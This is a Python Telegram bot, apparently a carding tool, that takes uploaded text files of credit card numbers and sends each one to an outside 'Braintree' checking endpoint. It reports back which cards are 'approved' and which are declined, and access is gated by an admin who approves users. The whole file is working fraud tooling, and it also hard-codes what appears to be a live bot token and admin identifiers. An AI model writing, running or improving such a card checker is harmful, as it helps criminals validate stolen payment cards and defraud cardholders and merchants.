import os
import time
import asyncio
import aiofiles
import requests
from aiogram import Bot, Dispatcher, types
from aiogram.types import InputFile
from aiogram import F
from aiogram.enums import ParseMode
from aiogram.filters import Command
from aiogram.utils.markdown import hbold
from aiogram.utils.callback_answer import CallbackAnswerMiddleware

API_TOKEN = '7754185214:AAGbe0EMJ8qzlnUtS4Ee-ggyCFDBGYIVyKQ'
ADMIN_USERNAME = '@Darkboy336'
ADMIN_CHAT_ID = 7535818274  # Admin chat ID
BRAINTREE_API_URL = 'https://darkboy-b3.onrender.com/key=dark/cc='

bot = Bot(token=API_TOKEN)
dp = Dispatcher()

# Approved Users
approved_users = []

# Start Command
@dp.message(Command("start"))
async def send_welcome(message: types.Message):
    user_id = message.from_user.id
    username = message.from_user.username

    if user_id == ADMIN_CHAT_ID or user_id in approved_users:
        await message.answer(f"✅ Welcome @{username}!\nSend a .txt file to start CC checking.")
    else:
        await message.answer(f"❗ Access Denied! Contact {ADMIN_USERNAME} for approval.")

# Approve Command (Admin Only)
@dp.message(Command("approve"))
async def approve_user(message: types.Message):
    if message.from_user.id == ADMIN_CHAT_ID:
        try:
            user_id = int(message.text.split()[1])
            approved_users.append(user_id)
            await message.answer(f"✅ User {user_id} approved successfully!")
        except:
            await message.answer("❗ Invalid User ID")
    else:
        await message.answer("❗ You are not authorized to approve users.")

# Handle File Upload
@dp.message(F.document)
async def handle_docs(message: types.Message):
    user_id = message.from_user.id

    if user_id != ADMIN_CHAT_ID and user_id not in approved_users:
        await message.answer("❗ You are not authorized to use this bot.")
        return
    
    document = message.document

    if not document.file_name.endswith(".txt"):
        await message.answer("❗ Please upload a valid .txt file containing CCs.")
        return

    await message.answer("🕒 Processing your file... Please wait.")

    file_path = f"{document.file_name}"
    await bot.download(file=document.file_id, destination=file_path)

    # Start CC Checking
    await check_ccs(file_path, message)

async def check_ccs(file_path, message):
    approved = 0
    dead = 0
    invalid = 0
    total = 0
    consecutive_invalid = 0  # Counter for consecutive invalid cards
    start_time = time.time()

    async with aiofiles.open(file_path, mode='r') as file:
        lines = await file.readlines()
        total = len(lines)

        # Send the initial summary message
        summary_message = await message.answer(
            f"┏━━━━━━━⍟\n"
            f"┃ 𝐌𝐚𝐬𝐬 𝐂𝐡𝐞𝐜𝐤 𝐑𝐞𝐬𝐮𝐥𝐭\n"
            f"┗━━━━━━━━━━━⊛\n"
            f"┏━━━━━━━━━━━━━━━━━┓\n"
            f"┃𝑻𝑶𝑻𝑨𝑳 𝑪𝑨𝑹𝑫𝑺 ➜ {total}\n"
            f"┃𝑨𝑷𝑷𝑹𝑶𝑽𝑬𝑫 ➜ {approved}\n"
            f"┃𝑫𝑬𝑪𝑳𝑰𝑵𝑬𝑫 ➜ {dead}\n"
            f"┃𝑬𝑹𝑹𝑶𝑹 ➜ {invalid}\n"
            f"┃𝑪𝑪𝑵 ➜ 0\n"
            f"┃━━━━━━━━━━━━━━━━━\n"
            f"┃𝑻𝑰𝑴𝑬 ➜ {time.time() - start_time:.2f}s\n"
            f"┃𝑪𝑯𝑬𝑪𝑲𝑬𝑫 𝑩𝒀 ➜ {message.from_user.full_name}\n"
            f"┃𝑩𝑶𝑻 𝑩𝒀 ➜ 𝑫𝒂𝒓𝒌𝒃𝒐𝒚 𝑿 ⁷\n"
            f"┗━━━━━━━━━━━━━━━━━┛"
        )

        for index, card in enumerate(lines):
            card = card.strip()
            if not card:
                continue

            # Stop if 10 consecutive invalid cards are found
            if consecutive_invalid >= 10:
                await message.answer("❗ More than 10 invalid cards found. Stopping check.")
                break

            try:
                response = requests.get(f"{BRAINTREE_API_URL}{card}")
                print(f"Response for {card}: {response.text}")  # Debugging: Print raw response

                # Check if the card is approved
                if "Your card was declined." not in response.text:
                    approved += 1
                    consecutive_invalid = 0  # Reset invalid counter
                    # Send the approved card details
                    await message.answer(f"✅ Approved Card:\n{response.text}")
                else:
                    dead += 1
                    consecutive_invalid = 0  # Reset invalid counter

                # Update the summary message
                await bot.edit_message_text(
                    chat_id=summary_message.chat.id,
                    message_id=summary_message.message_id,
                    text=
                    f"┏━━━━━━━⍟\n"
                    f"┃ 𝐌𝐚𝐬𝐬 𝐂𝐡𝐞𝐜𝐤 𝐑𝐞𝐬𝐮𝐥𝐭\n"
                    f"┗━━━━━━━━━━━⊛\n"
                    f"┏━━━━━━━━━━━━━━━━━┓\n"
                    f"┃𝑻𝑶𝑻𝑨𝑳 𝑪𝑨𝑹𝑫𝑺 ➜ {total}\n"
                    f"┃𝑨𝑷𝑷𝑹𝑶𝑽𝑬𝑫 ➜ {approved}\n"
                    f"┃𝑫𝑬𝑪𝑳𝑰𝑵𝑬𝑫 ➜ {dead}\n"
                    f"┃𝑬𝑹𝑹𝑶𝑹 ➜ {invalid}\n"
                    f"┃𝑪𝑪𝑵 ➜ 0\n"
                    f"┃━━━━━━━━━━━━━━━━━\n"
                    f"┃𝑻𝑰𝑴𝑬 ➜ {time.time() - start_time:.2f}s\n"
                    f"┃𝑪𝑯𝑬𝑪𝑲𝑬𝑫 𝑩𝒀 ➜ {message.from_user.full_name}\n"
                    f"┃𝑩𝑶𝑻 𝑩𝒀 ➜ 𝑫𝒂𝒓𝒌𝒃𝒐𝒚 𝑿 ⁷\n"
                    f"┗━━━━━━━━━━━━━━━━━┛"
                )

            except Exception as e:
                invalid += 1
                consecutive_invalid += 1  # Increment invalid counter
                await bot.edit_message_text(
                    chat_id=summary_message.chat.id,
                    message_id=summary_message.message_id,
                    text=
                    f"┏━━━━━━━⍟\n"
                    f"┃ 𝐌𝐚𝐬𝐬 𝐂𝐡𝐞𝐜𝐤 𝐑𝐞𝐬𝐮𝐥𝐭\n"
                    f"┗━━━━━━━━━━━⊛\n"
                    f"┏━━━━━━━━━━━━━━━━━┓\n"
                    f"┃𝑻𝑶𝑻𝑨𝑳 𝑪𝑨𝑹𝑫𝑺 ➜ {total}\n"
                    f"┃𝑨𝑷𝑷𝑹𝑶𝑽𝑬𝑫 ➜ {approved}\n"
                    f"┃𝑫𝑬𝑪𝑳𝑰𝑵𝑬𝑫 ➜ {dead}\n"
                    f"┃𝑬𝑹𝑹𝑶𝑹 ➜ {invalid}\n"
                    f"┃𝑪𝑪𝑵 ➜ 0\n"
                    f"┃━━━━━━━━━━━━━━━━━\n"
                    f"┃𝑻𝑰𝑴𝑬 ➜ {time.time() - start_time:.2f}s\n"
                    f"┃𝑪𝑯𝑬𝑪𝑲𝑬𝑫 𝑩𝒀 ➜ {message.from_user.full_name}\n"
                    f"┃𝑩𝑶𝑻 𝑩𝒀 ➜ 𝑫𝒂𝒓𝒌𝒃𝒐𝒚 𝑿 ⁷\n"
                    f"┗━━━━━━━━━━━━━━━━━┛"
                )

            # Add a delay to avoid rate limits
            time.sleep(1)  # 1 second delay between requests

        # Final summary
        await message.answer(
            f"✅ Approved Cards: {approved}\n"
            f"🎯 Dead Cards: {dead}\n"
            f"❗ Errors: {invalid}\n"
            f"🕒 Total Time: {time.time() - start_time:.2f}s\n"
            f"🔚 Checking Complete!"
        )

    os.remove(file_path)

# Start Bot
async def main():
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())